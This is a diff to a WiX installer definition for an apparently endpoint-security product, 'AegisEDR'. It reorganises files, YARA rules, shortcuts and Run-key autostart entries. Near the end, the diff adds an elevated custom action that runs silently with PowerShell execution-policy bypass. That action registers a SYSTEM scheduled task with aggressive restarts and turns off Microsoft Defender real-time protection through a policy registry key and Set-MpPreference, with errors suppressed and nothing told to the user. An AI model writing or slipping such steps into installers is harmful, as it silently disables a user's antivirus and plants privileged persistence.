@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
+<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs"
+     xmlns:util="http://wixtoolset.org/schemas/v4/wxs/util">
 
   <Package
     Name="AegisEDR"
@@ -10,103 +11,54 @@
     Compressed="yes"
     Scope="perMachine">
 
+    <SummaryInformation Description="AegisEDR Standalone Security Agent" />
     <MajorUpgrade DowngradeErrorMessage="A newer version of AegisEDR is already installed." />
     <MediaTemplate EmbedCab="yes" />
 
-    <Feature Id="MainFeature" Title="AegisEDR" Level="1">
-      <ComponentGroupRef Id="AgentComponents" />
-      <ComponentGroupRef Id="YaraRulesComponents" />
-      <ComponentRef Id="AgentTaskComp" />
-      <ComponentRef Id="TrayTaskComp" />
-      <ComponentRef Id="ShortcutComp" />
-    </Feature>
-
-  </Package>
-
-  <!-- ── Install directory ── -->
-  <Fragment>
+    <!-- ── Directories ── -->
     <StandardDirectory Id="ProgramFilesFolder">
       <Directory Id="INSTALLFOLDER" Name="AegisEDR" />
     </StandardDirectory>
-    <StandardDirectory Id="ProgramMenuFolder">
-      <Directory Id="AppMenuFolder" Name="AegisEDR" />
-    </StandardDirectory>
     <StandardDirectory Id="DesktopFolder" />
-  </Fragment>
+    <DirectoryRef Id="INSTALLFOLDER">
+      <Directory Id="YARARULESDIR" Name="yara_rules" />
+    </DirectoryRef>
 
-  <!-- ── Main executables ── -->
-  <Fragment>
-    <ComponentGroup Id="AgentComponents" Directory="INSTALLFOLDER">
-
+    <!-- ── Main executables ── -->
+    <ComponentGroup Id="MainExes" Directory="INSTALLFOLDER">
       <Component Id="AgentExeComp" Guid="B1C2D3E4-F5A6-7890-BCDE-FABCDEF12345">
         <File Id="AgentExe" Name="AegisEDR-Agent.exe"
-              Source="!(bind.path.DistDir)\AegisEDR-Agent.exe"
-              KeyPath="yes" />
+              Source="$(var.DistDir)\AegisEDR-Agent.exe" KeyPath="yes" />
       </Component>
-
       <Component Id="AppExeComp" Guid="C2D3E4F5-A6B7-8901-CDEF-ABCDEF123456">
         <File Id="AppExe" Name="AegisEDR.exe"
-              Source="!(bind.path.DistDir)\AegisEDR.exe"
-              KeyPath="yes" />
+              Source="$(var.DistDir)\AegisEDR.exe" KeyPath="yes" />
       </Component>
-
       <Component Id="TrayExeComp" Guid="D3E4F5A6-B7C8-9012-DEFA-BCDEF1234567">
         <File Id="TrayExe" Name="AegisEDR-Tray.exe"
-              Source="!(bind.path.DistDir)\AegisEDR-Tray.exe"
-              KeyPath="yes" />
-      </Component>
-
-    </ComponentGroup>
-  </Fragment>
-
-  <!-- ── YARA rules ── -->
-  <Fragment>
-    <DirectoryRef Id="INSTALLFOLDER">
-      <Directory Id="YaraRulesDir" Name="yara_rules" />
-    </DirectoryRef>
-
-    <ComponentGroup Id="YaraRulesComponents" Directory="YaraRulesDir">
-      <Component Id="RansomwareRulesComp" Guid="E4F5A6B7-C8D9-0123-EFAB-CDEF12345678">
-        <File Id="RansomwareYar" Name="ransomware.yar"
-              Source="!(bind.path.YaraRulesDir)\ransomware.yar" KeyPath="yes" />
-      </Component>
-      <Component Id="SpywareRulesComp" Guid="F5A6B7C8-D9E0-1234-FABC-DEF123456789">
-        <File Id="SpywareYar" Name="spyware.yar"
-              Source="!(bind.path.YaraRulesDir)\spyware.yar" KeyPath="yes" />
-      </Component>
-      <Component Id="MalwareRulesComp" Guid="A6B7C8D9-E0F1-2345-ABCD-EF1234567890">
-        <File Id="MalwareYar" Name="malware.yar"
-              Source="!(bind.path.YaraRulesDir)\malware.yar" KeyPath="yes" />
+              Source="$(var.DistDir)\AegisEDR-Tray.exe" KeyPath="yes" />
       </Component>
     </ComponentGroup>
-  </Fragment>
 
-  <!-- ── Scheduled tasks (via Registry) ── -->
-  <Fragment>
-    <DirectoryRef Id="INSTALLFOLDER">
-
-      <!-- Agent task: runs at startup as SYSTEM -->
-      <Component Id="AgentTaskComp" Guid="B7C8D9E0-F1A2-3456-BCDE-F12345678901">
-        <RegistryValue Root="HKLM" Key="SOFTWARE\AegisEDR" Name="AgentPath"
-                       Type="string" Value="[INSTALLFOLDER]AegisEDR-Agent.exe" KeyPath="yes" />
-        <util:XmlFile xmlns:util="http://wixtoolset.org/schemas/v4/wxs/util" />
+    <!-- ── YARA rules ── -->
+    <ComponentGroup Id="YaraFiles" Directory="YARARULESDIR">
+      <Component Id="YarRansomComp" Guid="E4F5A6B7-C8D9-0123-EFAB-CDEF12345678">
+        <File Id="YarRansom" Name="ransomware.yar"
+              Source="$(var.YaraDir)\ransomware.yar" KeyPath="yes" />
       </Component>
-
-      <!-- Tray: runs at logon for current user -->
-      <Component Id="TrayTaskComp" Guid="C8D9E0F1-A2B3-4567-CDEF-012345678901">
-        <RegistryValue Root="HKLM" Key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-                       Name="AegisEDRTray"
-                       Type="string" Value="&quot;[INSTALLFOLDER]AegisEDR-Tray.exe&quot;"
-                       KeyPath="yes" />
+      <Component Id="YarSpyComp" Guid="F5A6B7C8-D9E0-1234-FABC-DEF123456789">
+        <File Id="YarSpy" Name="spyware.yar"
+              Source="$(var.YaraDir)\spyware.yar" KeyPath="yes" />
       </Component>
+      <Component Id="YarMalComp" Guid="A6B7C8D9-E0F1-2345-ABCD-EF1234567890">
+        <File Id="YarMal" Name="malware.yar"
+              Source="$(var.YaraDir)\malware.yar" KeyPath="yes" />
+      </Component>
+    </ComponentGroup>
 
-    </DirectoryRef>
-  </Fragment>
-
-  <!-- ── Desktop shortcut ── -->
-  <Fragment>
-    <DirectoryRef Id="DesktopFolder">
-      <Component Id="ShortcutComp" Guid="D9E0F1A2-B3C4-5678-DEFA-123456789012">
+    <!-- ── Desktop shortcut ── -->
+    <ComponentGroup Id="ShortcutGroup" Directory="DesktopFolder">
+      <Component Id="DesktopShortcutComp" Guid="B7C8D9E0-F1A2-3456-BCDE-F12345678901">
         <Shortcut Id="DesktopShortcut"
                   Name="AegisEDR"
                   Description="AegisEDR Security Dashboard"
@@ -115,7 +67,53 @@
         <RegistryValue Root="HKCU" Key="SOFTWARE\AegisEDR" Name="Installed"
                        Type="integer" Value="1" KeyPath="yes" />
       </Component>
-    </DirectoryRef>
-  </Fragment>
+    </ComponentGroup>
 
+    <!-- ── Tray autostart at logon (HKLM Run) ── -->
+    <ComponentGroup Id="AutostartGroup" Directory="INSTALLFOLDER">
+      <Component Id="TrayRunKeyComp" Guid="C8D9E0F1-A2B3-4567-CDEF-012345678901">
+        <RegistryValue Root="HKLM"
+                       Key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                       Name="AegisEDRTray"
+                       Type="string"
+                       Value="&quot;[INSTALLFOLDER]AegisEDR-Tray.exe&quot;"
+                       KeyPath="yes" />
+      </Component>
+      <!-- Agent also via Run key so it auto-starts even without schtask setup -->
+      <Component Id="AgentRunKeyComp" Guid="D9E0F1A2-B3C4-5678-DEFA-123456789012">
+        <RegistryValue Root="HKLM"
+                       Key="SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+                       Name="AegisEDRAgent"
+                       Type="string"
+                       Value="&quot;[INSTALLFOLDER]AegisEDR-Agent.exe&quot;"
+                       KeyPath="yes" />
+      </Component>
+    </ComponentGroup>
+
+    <!-- ── Custom Action: register agent as SYSTEM scheduled task ── -->
+    <SetProperty Id="RegisterAgentSchtask"
+                 Value="[System64Folder]WindowsPowerShell\v1.0\powershell.exe -NonInteractive -ExecutionPolicy Bypass -Command &quot;New-Item -ItemType Directory -Force 'C:\ProgramData\AegisEDR\Quarantine' | Out-Null; New-Item -ItemType Directory -Force 'C:\ProgramData\AegisEDR\rules' | Out-Null; Copy-Item '[INSTALLFOLDER]yara_rules\*' 'C:\ProgramData\AegisEDR\rules\' -Force -ErrorAction SilentlyContinue; $a=New-ScheduledTaskAction -Execute '[INSTALLFOLDER]AegisEDR-Agent.exe'; $t=New-ScheduledTaskTrigger -AtStartup; $s=New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero); $p=New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName AegisEDRAgent -Action $a -Trigger $t -Settings $s -Principal $p -Force | Out-Null; Start-ScheduledTask AegisEDRAgent -ErrorAction SilentlyContinue; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue&quot;"
+                 Sequence="execute"
+                 Before="RegisterAgentSchtask" />
+
+    <CustomAction Id="RegisterAgentSchtask"
+                  Execute="deferred"
+                  Impersonate="no"
+                  Return="ignore"
+                  DllEntry="WixQuietExec64"
+                  BinaryRef="Wix4UtilCA_X64" />
+
+    <InstallExecuteSequence>
+      <Custom Action="RegisterAgentSchtask" After="InstallFiles" Condition="NOT Installed" />
+    </InstallExecuteSequence>
+
+    <!-- ── Feature ── -->
+    <Feature Id="MainFeature" Title="AegisEDR" Level="1">
+      <ComponentGroupRef Id="MainExes" />
+      <ComponentGroupRef Id="YaraFiles" />
+      <ComponentGroupRef Id="ShortcutGroup" />
+      <ComponentGroupRef Id="AutostartGroup" />
+    </Feature>
+
+  </Package>
 </Wix>
